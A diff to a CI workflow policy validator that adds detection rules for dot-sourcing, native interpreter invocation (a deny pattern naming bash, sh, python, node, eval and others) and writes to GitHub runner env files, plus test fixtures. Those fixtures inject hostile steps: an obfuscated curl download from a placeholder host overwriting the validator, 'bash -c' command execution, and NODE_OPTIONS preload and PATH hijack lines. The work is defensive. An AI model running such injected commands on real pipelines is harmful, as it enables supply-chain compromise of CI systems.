@@ -152,7 +152,7 @@ const NETWORK_CLIENT = /\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|i
 // Enumerating the indirect writers (Set-Variable, New-Variable, the Variable:
 // provider, [ref] handles) is the same losing shape, so the whole reviewed
 // script is pinned instead: any edit at all changes this digest.
-const REVIEWED_VALIDATION_STEP_DIGEST = '35d03833ba858f70c6e2da4bf2c355660f65a09459887301bdff18a9e2e16551';
+const REVIEWED_VALIDATION_STEP_DIGEST = 'c8bf608a85ef9d60f792a043f0301f9628176b32076674df8673b67994c829b0';
 
 // The credential-cleanup step's assertions all test for the presence of a
 // sequence, and presence is not execution: an inserted early exit satisfies
@@ -1006,10 +1006,37 @@ function validateAcquireStep(step, label, expected) {
       reject('acquire-policy', `${label} invokes something other than a reviewed literal command`);
     }
   }
-  for (const call of stepCode.matchAll(/(?:^[ \t]*|[;{|][ \t]*)\.[^\S\n]*([^\s]+)/gmu)) {
+  // PowerShell's assignment grammar permits a statement on the right-hand
+  // side, so `$null = . $strClient` dot-sources -- verified on 7.6.4. The
+  // anchor therefore admits the assignment and sub-expression contexts too,
+  // not just statement starts. This list is not claimed to be exhaustive of
+  // PowerShell's grammar; the positive controls are the tail, the digest and
+  // the interpreter ban below, and this is a further net rather than a proof.
+  for (const call of stepCode.matchAll(/(?:^[ \t]*|[;{|=(,][ \t]*|&&[ \t]*|\|\|[ \t]*)\.[^\S\n]*([^\s]+)/gmu)) {
     if (!arrReviewedTargets.includes(call[1])) {
       reject('acquire-policy', `${label} dot-sources something other than a reviewed literal command`);
     }
+  }
+  // A native interpreter is a literal command name that runs an arbitrary
+  // command string, so it defeats the closure argument above without using
+  // either PowerShell invocation operator. Bash documents -c as executing its
+  // string argument; the same is true of sh, python, perl and the rest. None
+  // has any legitimate use in an acquire step, whose whole job is a fetch.
+  // Anchored at command position, the same way the dot-source scan is. Without
+  // that anchor the names collide with ordinary prose: "acquire: node download
+  // exited ..." inside a throw message is not an invocation, and four such
+  // strings tripped this rule the first time it was written.
+  if (/(?:^[ \t]*|[;{|=(][ \t]*)(?:\/(?:usr\/)?bin\/)?(?:bash|sh|dash|ksh|zsh|csh|tcsh|python[0-9.]*|perl|ruby|node|pwsh|powershell|env|xargs|awk|eval|nohup|setsid|timeout)\b/imu.test(stepCode)) {
+    reject('acquire-policy', `${label} invokes a native interpreter`);
+  }
+  // The runner applies $GITHUB_ENV and $GITHUB_PATH to every subsequent step,
+  // so an acquire step that appends NODE_OPTIONS=--require=<payload> preloads
+  // repository-controlled code into npm and the policy validator without
+  // touching a reviewed file, a version probe or a captured status. build.yml
+  // already asserts these files stay empty around the generator; acquire steps
+  // must not write them either.
+  if (/GITHUB_ENV|GITHUB_PATH|GITHUB_OUTPUT|GITHUB_STATE|GITHUB_STEP_SUMMARY/u.test(step.run)) {
+    reject('acquire-policy', `${label} writes a runner step communication file`);
   }
   // Named literals that run a string as a command. Microsoft documents
   // Invoke-Expression as evaluating "a specified string as a command" and notes
@@ -1177,6 +1204,11 @@ export function validateMarkdownPolicy(workflow, source) {
     // so script-shell there is a lint bypass that leaves every other check green.
     "@('.npmrc', '../.npmrc', '../../.npmrc')",
     'supply: repository-controlled npm configuration is present',
+    // npm also reads a per-user and a global config outside the repository
+    // tree; script-shell in either replaces the interpreter for every npm run.
+    '$env:npm_config_userconfig =',
+    '$env:npm_config_globalconfig =',
+    'supply: the neutralized npm configuration path exists',
     // What the lint does, not only what it runs. Derived from the reviewed
     // constants so the gate and this baseline cannot drift apart silently.
     REVIEWED_LINT_DIGESTS['.markdownlint.jsonc'].toUpperCase(),
@@ -1735,6 +1767,22 @@ const FIXTURE_INVENTORY = Object.freeze([
   // statement position. It is the form the script-path rule exists for.
   ['T1-MARKDOWN-045', 'script path invoked bare from the acquire step', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          tools/prepare.ps1\n          $strNodeUrl = 'https://nodejs.org")],
   ['T1-BUILD-134', 'script path invoked bare from the build acquire step', 'build', (source) => replaceOnce(source, '          $strServerUrl = $env:GITHUB_SERVER_URL\n', '          tools/prepare.ps1\n          $strServerUrl = $env:GITHUB_SERVER_URL\n')],
+  // Round 39. PowerShell's assignment grammar permits a statement on the
+  // right-hand side, so the dot is preceded by = rather than a statement
+  // separator -- verified on 7.6.4, `$null = . $p` dot-sourced.
+  ['T1-MARKDOWN-046', 'command dot-sourced from an assignment right-hand side', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $strClient = 'cu' + 'rl'\n          $null = . $strClient --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
+  // A native interpreter runs an arbitrary command string using neither
+  // PowerShell invocation operator and with no contiguous client name.
+  ['T1-MARKDOWN-047', 'command string executed through a native interpreter', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $strCommand = 'cu' + 'rl --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v'\n          /bin/bash -c $strCommand\n          $strNodeUrl = 'https://nodejs.org")],
+  ['T1-BUILD-135', 'command string executed through a native interpreter in the build acquire step', 'build', (source) => replaceOnce(source, '          $strServerUrl = $env:GITHUB_SERVER_URL\n', "          $strCommand = 'gi' + 't fetch https://example.invalid/x'\n          bash -c $strCommand\n          $strServerUrl = $env:GITHUB_SERVER_URL\n")],
+  // $GITHUB_ENV applies to every later step, so NODE_OPTIONS=--require
+  // preloads repository code into npm and the validator without touching a
+  // reviewed file, a version probe or a captured status.
+  ['T1-MARKDOWN-048', 'acquire step exports options to later steps', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Add-Content -Path $env:GITHUB_ENV -Value 'NODE_OPTIONS=--require=/tmp/payload.js'\n          $strNodeUrl = 'https://nodejs.org")],
+  ['T1-BUILD-136', 'build acquire step exports options to later steps', 'build', (source) => replaceOnce(source, '          $strServerUrl = $env:GITHUB_SERVER_URL\n', "          Add-Content -Path $env:GITHUB_PATH -Value '/tmp/hijack'\n          $strServerUrl = $env:GITHUB_SERVER_URL\n")],
+  // npm reads a per-user and a global config outside the repository tree, so
+  // script-shell in either replaces the interpreter for both lint phases.
+  ['T1-MARKDOWN-049', 'npm user and global configuration no longer neutralized', 'markdown', (source) => replaceOnce(source, "          $env:npm_config_userconfig = [System.IO.Path]::Combine($env:RUNNER_TEMP, 'absent-user-npmrc')\n", '')],
   ['T1-MARKDOWN-022', 'lint job regains a token scope', 'markdown', (source) => replaceOnce(source, '  markdownlint:\n    runs-on: ubuntu-latest\n    permissions: {}\n', '  markdownlint:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n')],
   ['T1-LINTASSET-001', 'all rules disabled in the lint configuration', 'lint-asset', {
     '.markdownlint.jsonc': '{ "default": false }\n',
@@ -1874,6 +1922,12 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-MARKDOWN-044": "markdown-policy: required phases are out of order at: ci --ignore-scripts --no-audit --no-fund",
   "T1-MARKDOWN-045": "acquire-policy: markdown.acquire references an executable script path",
   "T1-BUILD-134": "acquire-policy: build.verify.acquire references an executable script path",
+  "T1-MARKDOWN-046": "acquire-policy: markdown.acquire dot-sources something other than a reviewed literal command",
+  "T1-MARKDOWN-047": "acquire-policy: markdown.acquire invokes a native interpreter",
+  "T1-BUILD-135": "acquire-policy: build.verify.acquire invokes a native interpreter",
+  "T1-MARKDOWN-048": "acquire-policy: markdown.acquire writes a runner step communication file",
+  "T1-BUILD-136": "acquire-policy: build.verify.acquire writes a runner step communication file",
+  "T1-MARKDOWN-049": "markdown-policy: required phase is missing: $env:npm_config_userconfig =",
   "T1-MARKDOWN-014": "markdown-policy: required phase is missing: if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {",
   "T1-MARKDOWN-017": "markdown-policy: captured phase status intPolicyExit is not assigned exactly once",
   "T1-DEPENDABOT-001": "policy: Dependabot configuration differs from the locked policy",
